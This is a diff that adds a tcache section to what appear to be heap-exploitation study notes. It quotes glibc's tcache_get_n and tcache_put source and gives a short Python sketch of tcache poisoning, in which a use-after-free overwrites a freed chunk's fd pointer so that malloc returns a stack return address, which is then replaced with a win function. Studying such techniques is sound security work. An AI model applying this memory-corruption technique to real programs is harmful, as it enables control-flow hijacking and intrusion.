@@ -10,6 +10,76 @@
 > Then call `exit` or return from `main` to trigger clean up of filestreams to make it follow `_IO_list_all` to our fake `_IO_FILE` struct
 > 
 
+#### Tcache
+When allocating from tcachebin, the key is zeroed out.
+```c
+/* Caller must ensure that we know tc_idx is valid and there's
+   available chunks to remove.  Removes chunk from the middle of the
+   list.  */
+static __always_inline void *
+tcache_get_n (size_t tc_idx, tcache_entry **ep)
+{
+  tcache_entry *e;
+  if (ep == &(tcache->entries[tc_idx]))
+    e = *ep;
+  else
+    e = REVEAL_PTR (*ep);
+
+  if (__glibc_unlikely (!aligned_OK (e)))
+    malloc_printerr ("malloc(): unaligned tcache chunk detected");
+
+  if (ep == &(tcache->entries[tc_idx]))
+      *ep = REVEAL_PTR (e->next);
+  else
+    *ep = PROTECT_PTR (ep, REVEAL_PTR (e->next));
+
+  --(tcache->counts[tc_idx]);
+  e->key = 0;
+  return (void *) e;
+}
+```
+
+```c
+/* Caller must ensure that we know tc_idx is valid and there's room
+   for more chunks.  */
+static __always_inline void
+tcache_put (mchunkptr chunk, size_t tc_idx)
+{
+  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
+
+  /* Mark this chunk as "in the tcache" so the test in _int_free will
+     detect a double free.  */
+  e->key = tcache_key;
+
+  e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]);
+  tcache->entries[tc_idx] = e;
+  ++(tcache->counts[tc_idx]);
+}
+```
+
+Ex:
+Malloc chunks then free them. Here there is a use-after-free and we can write to a free chunk and overwrite the fd then malloc that address and write something to it. For example malloc the return address on the stack.
+```python
+malloc(0, 0x18)
+malloc(1, 0x18)
+
+free(0)
+free(1)
+
+scanf(1, p64(rip))
+
+malloc(2, 0x18)
+malloc(3, 0x18)
+
+
+scanf(3, p64(elf.sym.win))
+quit()
+```
+
+
+
+
+
 
 ## [Find which heap exploit to use](https://kissprogramming.com/heap/heap-search)
 
